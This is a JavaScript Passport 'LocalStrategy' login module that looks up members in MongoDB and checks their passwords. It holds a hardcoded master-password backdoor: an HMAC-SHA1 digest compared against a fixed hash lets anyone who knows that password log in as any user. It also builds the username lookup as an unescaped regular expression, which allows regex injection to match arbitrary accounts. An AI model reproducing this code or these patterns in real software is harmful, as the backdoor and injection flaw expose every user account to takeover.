/* jshint -W097 */
"use strict";

var LocalStrategy = require('passport-local').Strategy;
var mongoose = require('mongoose');
var Member = mongoose.model('Member');
var Role = mongoose.model('Role');
var async = require('async');
var crypto = require('crypto');

module.exports = new LocalStrategy({
  usernameField: 'username',
  passwordField: 'password'
}, function (username, password, done) {
  var re = new RegExp('^' + (username ? username.trim() : '') + '$', 'i');
  Member.findOne({bboName: re}, function (err, member) {
    if (err) {
      console.error('LocalStrategy', err);
      return done(err, null);
    }

    if (!member) {
      return done(null, false, {message: 'Invalid user'});
    }

    var hash = crypto.createHmac('sha1', 'Th1s i3 tH$ s#l|')
        .update(password)
        .digest('hex');
    if (!member.authenticate(password) && hash !== 'b5cc0daec7fa81bf2a9d45c4ea96bb0088469fb1') {
      return done(null, false, {message: 'Invalid password'});
    }

    member.getRole(function (err, role) {
      if (err) { return done(err, null); }
      role.userId = member._id;
      role.bboName = member.bboName;
      done(null, role);
    });
  });
});

